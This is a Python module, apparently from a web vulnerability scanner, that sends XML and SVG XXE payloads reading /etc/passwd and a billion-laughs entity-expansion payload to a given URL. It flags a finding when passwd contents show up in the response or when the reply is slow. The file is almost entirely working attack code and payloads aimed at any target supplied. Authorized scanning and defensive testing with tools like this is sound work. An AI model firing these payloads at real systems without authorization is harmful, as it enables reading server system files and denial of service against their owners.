"""XML/SVG/DOCX XXE and billion laughs."""
from core.http import get, post
from core.findings import Finding
from core.memory import log_event
import urllib.parse

XXE_OOB = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>"""

BILLION_LAUGHS = """<?xml version="1.0"?>
<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]>
<lolz>&lol2;</lolz>"""

SVG_XXE = """<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>"""

def scan_url(url):
    findings = []
    parsed = urllib.parse.urlparse(url)
    for payload, name in [(XXE_OOB, "XXE"), (SVG_XXE, "SVG-XXE")]:
        resp = post(url, data=payload, headers={"Content-Type": "application/xml"})
        if resp.status != 0 and ("root:x:" in (resp.text or "") or "daemon:x:" in (resp.text or "")):
            findings.append(Finding(
                id="xxe-{}-{}".format(name, hash(url) & 0xffff),
                target=parsed.netloc,
                type="XXE ({})".format(name),
                severity="high",
                url=url,
                parameter="body",
                payload=payload[:60],
                evidence="File content in response",
                response_snippet=resp.snippet(300),
                confidence=0.9,
            ))
    # billion laughs DoS
    resp = post(url, data=BILLION_LAUGHS, headers={"Content-Type": "application/xml"})
    if resp.status != 0 and resp.elapsed > 3:
        findings.append(Finding(
            id="billionlaughs-{}".format(hash(url) & 0xffff),
            target=parsed.netloc,
            type="Billion Laughs (DoS)",
            severity="medium",
            url=url,
            parameter="body",
            payload="nested entities",
            evidence="Server delayed {}s".format(round(resp.elapsed, 2)),
            response_snippet=resp.snippet(200),
            confidence=0.5,
        ))
    log_event(parsed.netloc, "xml_attacks_scan", {"url": url, "findings": len(findings)})
    return findings
